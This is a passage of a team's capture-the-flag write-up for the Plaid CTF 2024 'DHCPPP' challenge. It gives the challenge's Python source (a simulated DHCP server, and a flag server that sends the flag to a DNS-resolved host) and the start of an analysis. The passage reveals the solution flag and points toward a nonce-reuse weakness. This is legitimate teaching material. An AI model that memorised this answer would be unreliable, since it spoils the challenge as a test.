

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>




<!-- Mirrored from l3ak.team/2024/04/21/plaid24/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 May 2025 17:30:17 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="../../../../img/fluid.png">
  <link rel="icon" href="../../../../members/flag.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Matthias and Suvoni">
  <meta name="keywords" content="">
  
    <meta name="description" content="Writeup for DHCPP from Plaid CTF 2024.">
<meta property="og:type" content="article">
<meta property="og:title" content="Plaid CTF 2024 - [DHCPPP] - Misc &amp; Crypto">
<meta property="og:url" content="http://example.com/2024/04/21/plaid24/index.html">
<meta property="og:site_name" content="L3ak">
<meta property="og:description" content="Writeup for DHCPP from Plaid CTF 2024.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="../../../../../example.com/images/plaid24/plaid.html">
<meta property="article:published_time" content="2024-04-22T00:00:00.000Z">
<meta property="article:modified_time" content="2024-04-23T07:45:36.469Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="../../../../../example.com/images/plaid24/plaid.html">
  
  
  
  <title>Plaid CTF 2024 - [DHCPPP] - Misc &amp; Crypto - L3ak</title>

  <link  rel="stylesheet" href="../../../../../lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="../../../../../lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="../../../../../lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="../../../../../lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="../../../../../at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="../../../../../at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="../../../../css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="../../../../css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="../../../../css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":50,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="../../../../js/utils.js" ></script>
  <script  src="../../../../js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.1.1"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="../../../../index.html">
      <strong>L3ak CTF ðŸš©</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../index.html" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../members/index.html" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>Members</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('../../../../null.html') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Plaid CTF 2024 - [DHCPPP] - Misc &amp; Crypto"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        Matthias and Suvoni
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-04-21 20:00" pubdate>
          April 21, 2024 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          3.2k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          27 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Plaid CTF 2024 - [DHCPPP] - Misc &amp; Crypto</h1>
            
            
              <div class="markdown-body">
                
                <div class="note note-warning">
            <p><strong>Difficulty:</strong> <strong>Medium</strong><br><strong>Category:</strong> <strong>Misc and Cryptography</strong><br><strong>Flag:</strong> <strong><code>PCTF{d0nt_r3u5e_th3_n0nc3_d4839ed727736624}</code></strong></p>
          </div>

<h2 id="Challenge-DHCPPP"><a href="#Challenge-DHCPPP" class="headerlink" title="Challenge: DHCPPP"></a>Challenge: DHCPPP</h2><p>The local latin dance company is hosting a comp. They have a million-dollar wall of lava lamps and prizes so big this must be a once-in-a-lifetime opportunity.</p>
<p><em>Hypotheses</em>. Itâ€™s not DNS &#x2F;&#x2F; Thereâ€™s no way itâ€™s DNS &#x2F;&#x2F; It was DNS</p>
<h3 id="Attachment-dhcppp-py"><a href="#Attachment-dhcppp-py" class="headerlink" title="Attachment - dhcppp.py"></a>Attachment - dhcppp.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time, zlib<br><span class="hljs-keyword">import</span> secrets<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20_Poly1305<br><span class="hljs-keyword">import</span> dns.resolver<br><br>CHACHA_KEY = secrets.token_bytes(<span class="hljs-number">32</span>)<br>TIMEOUT = <span class="hljs-number">1e-1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_msg</span>(<span class="hljs-params">msg, nonce</span>):<br>    <span class="hljs-comment"># In case our RNG nonce is repeated, we also hash</span><br>    <span class="hljs-comment"># the message in. This means the worst-case scenario</span><br>    <span class="hljs-comment"># is that our nonce reflects a hash of the message</span><br>    <span class="hljs-comment"># but saves the chance of a nonce being reused across</span><br>    <span class="hljs-comment"># different messages</span><br>    nonce = sha256(msg[:<span class="hljs-number">32</span>] + nonce[:<span class="hljs-number">32</span>])[:<span class="hljs-number">12</span>]<br><br>    cipher = ChaCha20_Poly1305.new(key=CHACHA_KEY, nonce=nonce)<br>    ct, tag = cipher.encrypt_and_digest(msg)<br><br>    <span class="hljs-keyword">return</span> ct+tag+nonce<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_msg</span>(<span class="hljs-params">msg</span>):<br>    ct = msg[:-<span class="hljs-number">28</span>]<br>    tag = msg[-<span class="hljs-number">28</span>:-<span class="hljs-number">12</span>]<br>    nonce = msg[-<span class="hljs-number">12</span>:]<br><br>    cipher = ChaCha20_Poly1305.new(key=CHACHA_KEY, nonce=nonce)<br>    pt = cipher.decrypt_and_verify(ct, tag)<br><br>    <span class="hljs-keyword">return</span> pt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_crc</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">return</span> zlib.crc32(msg).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">return</span> hashlib.sha256(msg).digest()<br><br>RNG_INIT = secrets.token_bytes(<span class="hljs-number">512</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DHCPServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.leases = []<br>        self.ips = [<span class="hljs-string">f&quot;192.168.1.<span class="hljs-subst">&#123;i&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>)]<br>        self.mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1b 7d 6f 49 37 c9&quot;</span>)<br>        self.gateway_ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><br>        self.leases.append((<span class="hljs-string">&quot;192.168.1.2&quot;</span>, <span class="hljs-string">b&quot;rngserver_0&quot;</span>, time.time(), []))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_lease</span>(<span class="hljs-params">self, dev_name</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.ips) != <span class="hljs-number">0</span>:<br>            ip = self.ips.pop(<span class="hljs-number">0</span>)<br>            self.leases.append((ip, dev_name, time.time(), []))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># relinquish the oldest lease</span><br>            old_lease = self.leases.pop(<span class="hljs-number">0</span>)<br>            ip = old_lease[<span class="hljs-number">0</span>]<br>            self.leases.append((ip, dev_name, time.time(), []))<br><br>        pkt = <span class="hljs-built_in">bytearray</span>(<br>            <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>            <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self.gateway_ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>            <span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) +<br>            <span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>]) +<br>            <span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]) +<br>            dev_name +<br>            <span class="hljs-string">b&quot;\x00&quot;</span><br>        )<br><br>        pkt = <span class="hljs-string">b&quot;\x02&quot;</span> + encrypt_msg(pkt, self.get_entropy_from_lavalamps()) + calc_crc(pkt)<br><br>        <span class="hljs-keyword">return</span> pkt<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_entropy_from_lavalamps</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># Get entropy from all available lava-lamp RNG servers</span><br>        <span class="hljs-comment"># Falling back to local RNG if necessary</span><br>        entropy_pool = RNG_INIT<br><br>        <span class="hljs-keyword">for</span> ip, name, ts, tags <span class="hljs-keyword">in</span> self.leases:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;rngserver&quot;</span> <span class="hljs-keyword">in</span> name:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-comment"># get entropy from the server</span><br>                    output = requests.get(<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;ip&#125;</span>/get_rng&quot;</span>, timeout=TIMEOUT).text<br>                    entropy_pool += sha256(output.encode())<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-comment"># if the server is broken, get randomness from local RNG instead</span><br>                    entropy_pool += sha256(secrets.token_bytes(<span class="hljs-number">512</span>))<br><br>        <span class="hljs-keyword">return</span> sha256(entropy_pool)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_pkt</span>(<span class="hljs-params">self, pkt</span>):<br>        <span class="hljs-keyword">assert</span> pkt <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br><br>        src_mac = pkt[:<span class="hljs-number">6</span>]<br>        dst_mac = pkt[<span class="hljs-number">6</span>:<span class="hljs-number">12</span>]<br>        msg = pkt[<span class="hljs-number">12</span>:]<br><br>        <span class="hljs-keyword">if</span> dst_mac != self.mac:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">if</span> src_mac == self.mac:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x01&quot;</span>):<br>            <span class="hljs-comment"># lease request</span><br>            dev_name = msg[<span class="hljs-number">1</span>:]<br>            lease_resp = self.get_lease(dev_name)<br>            <span class="hljs-keyword">return</span> (<br>                self.mac +<br>                src_mac + <span class="hljs-comment"># dest mac</span><br>                lease_resp<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FlagServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, dhcp</span>):<br>        self.mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;53 79 82 b5 97 eb&quot;</span>)<br>        self.dns = dns.resolver.Resolver()<br>        self.process_pkt(dhcp.process_pkt(self.mac+dhcp.mac+<span class="hljs-string">b&quot;\x01&quot;</span>+<span class="hljs-string">b&quot;flag_server&quot;</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_flag</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            flag = f.read().strip()<br>        curl(<span class="hljs-string">&quot;example.com&quot;</span>, <span class="hljs-string">f&quot;/<span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>, self.dns)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_pkt</span>(<span class="hljs-params">self, pkt</span>):<br>        <span class="hljs-keyword">assert</span> pkt <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br><br>        src_mac = pkt[:<span class="hljs-number">6</span>]<br>        dst_mac = pkt[<span class="hljs-number">6</span>:<span class="hljs-number">12</span>]<br>        msg = pkt[<span class="hljs-number">12</span>:]<br><br>        <span class="hljs-keyword">if</span> dst_mac != self.mac:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">if</span> src_mac == self.mac:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x02&quot;</span>):<br>            <span class="hljs-comment"># lease response</span><br>            pkt = msg[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>]<br>            pkt = decrypt_msg(pkt)<br>            crc = msg[-<span class="hljs-number">4</span>:]<br>            <span class="hljs-keyword">assert</span> crc == calc_crc(pkt)<br><br>            self.ip = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>            self.gateway_ip = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])<br>            self.subnet_mask = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>])<br>            self.dns1 = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>])<br>            self.dns2 = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">16</span>:<span class="hljs-number">20</span>])<br>            self.dns.nameservers = [self.dns1, self.dns2]<br>            <span class="hljs-keyword">assert</span> pkt.endswith(<span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FLAG SERVER] [DEBUG] Got DHCP lease&quot;</span>, self.ip, self.gateway_ip, self.subnet_mask, self.dns1, self.dns2)<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x03&quot;</span>):<br>            <span class="hljs-comment"># FREE FLAGES!!!!!!!</span><br>            self.send_flag()<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">curl</span>(<span class="hljs-params">url, path, dns</span>):<br>    ip = <span class="hljs-built_in">str</span>(dns.resolve(url).response.resolve_chaining().answer).strip().split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>]<br>    url = <span class="hljs-string">&quot;http://&quot;</span> + ip<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Sending flage to <span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>    requests.get(url + path)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    dhcp = DHCPServer()<br>    flagserver = FlagServer(dhcp)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        pkt = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).strip())<br><br>        out = dhcp.process_pkt(pkt)<br>        <span class="hljs-keyword">if</span> out <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(out.<span class="hljs-built_in">hex</span>())<br><br>        out = flagserver.process_pkt(pkt)<br>        <span class="hljs-keyword">if</span> out <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(out.<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure>

<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>At first glance, we can make out a couple of helper functions, a <strong>main</strong> function as well as two server classes: A <strong>DhcpServer</strong> and a <strong>FlagServer</strong>. Letâ€™s take a deep dive into the code to understand the provided funtions.</p>
<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><p>The <strong>main</strong> function creates an instance of the <strong>DhcpServer</strong> class and an instance of the <strong>FlagServer</strong> class (which is using the DhcpServer instance). Then it enters an infinite loop of reading hex encoded packet data from the command line, passing it to both server instances and printing their outputs &#x2F; return values as hex. Additionally, we can see that both servers declare a <code>process_pkt(packet)</code> function, which seems to handle the incoming requests for the respective server.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    dhcp = DHCPServer()<br>    flagserver = FlagServer(dhcp)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        pkt = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).strip())<br><br>        out = dhcp.process_pkt(pkt)<br>        <span class="hljs-keyword">if</span> out <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(out.<span class="hljs-built_in">hex</span>())<br><br>        out = flagserver.process_pkt(pkt)<br>        <span class="hljs-keyword">if</span> out <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(out.<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure>

<h3 id="Helper-functions-and-static-data"><a href="#Helper-functions-and-static-data" class="headerlink" title="Helper functions and static data"></a>Helper functions and static data</h3><p>When analyzing the helper functions and static data, we can see two randomly-generated byte strings that are generated in a cryptographically secure way: <code>CHACHA_KEY</code> and the <code>RNG_INIT</code>, with lengths of 32 and 512 bytes, respectively.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secrets<br><br>CHACHA_KEY = secrets.token_bytes(<span class="hljs-number">32</span>)<br>RNG_INIT = secrets.token_bytes(<span class="hljs-number">512</span>)<br></code></pre></td></tr></table></figure>

<p>Additionally, there are helper functions to compute a <strong>crc32</strong> checksum and a <strong>SHA256</strong> hash - nothing out of the ordinary.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_crc</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">return</span> zlib.crc32(msg).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">return</span> hashlib.sha256(msg).digest()<br></code></pre></td></tr></table></figure>

<p>We also have some functions to encrypt and decrypt data using the <strong>ChaCha20_Poly1305</strong> algorithm, which uses a <code>key</code> and a <code>nonce</code> to encrypt a <code>message</code> and produces a <code>ciphertext</code> and an authentication <code>tag</code> (a.k.a. message authentication code or MAC for short - not to be confused with a <em>MAC address</em> though).</p>
